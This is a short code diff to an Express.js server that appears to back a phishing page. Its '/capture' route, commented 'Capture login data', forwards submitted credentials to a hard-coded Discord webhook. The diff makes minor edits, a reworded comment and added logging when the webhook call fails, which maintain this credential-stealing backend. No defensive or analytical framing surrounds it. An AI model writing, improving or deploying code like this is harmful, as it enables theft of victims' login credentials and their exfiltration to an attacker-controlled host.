@@ -10,7 +10,7 @@ const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1489947599749382146/wm
 app.use(cors());
 app.use(express.json());
 
-// Serve static files (index.html and 1.html)
+// Serve your HTML files
 app.use(express.static(__dirname));
 
 // Capture login data
@@ -36,7 +36,9 @@ app.post('/capture', async (req, res) => {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
         });
-    } catch (e) {}
+    } catch (e) {
+        console.error("Webhook failed");
+    }
 
     res.json({ success: true });
 });
